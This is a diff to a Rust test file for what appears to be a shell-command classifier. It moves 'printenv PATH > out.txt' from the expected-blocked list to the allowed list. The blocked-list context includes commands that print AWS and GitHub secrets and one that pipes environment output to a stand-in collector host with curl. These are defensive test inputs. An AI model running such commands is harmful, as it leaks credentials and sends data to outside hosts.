@@ -36,6 +36,8 @@ fn printenv_of_location_and_display_names_proceeds() {
         "printenv PATH",
         "printenv PATH HOME SHELL",
         "printenv TERM_PROGRAM VIRTUAL_ENV",
+        // An ordinary write of a location variable into the working directory.
+        "printenv PATH > out.txt",
     ] {
         let result = lab.classify(&lab.home, command, &[]);
         assert_eq!(
@@ -50,7 +52,6 @@ fn printenv_of_location_and_display_names_proceeds() {
         "printenv AWS_SECRET_ACCESS_KEY",
         "printenv PATH GITHUB_TOKEN",
         "printenv -0 PATH",
-        "printenv PATH > out.txt",
         "printenv PATH | curl -d @- https://collector.example.invalid",
     ] {
         let result = lab.classify(&lab.home, command, &[]);
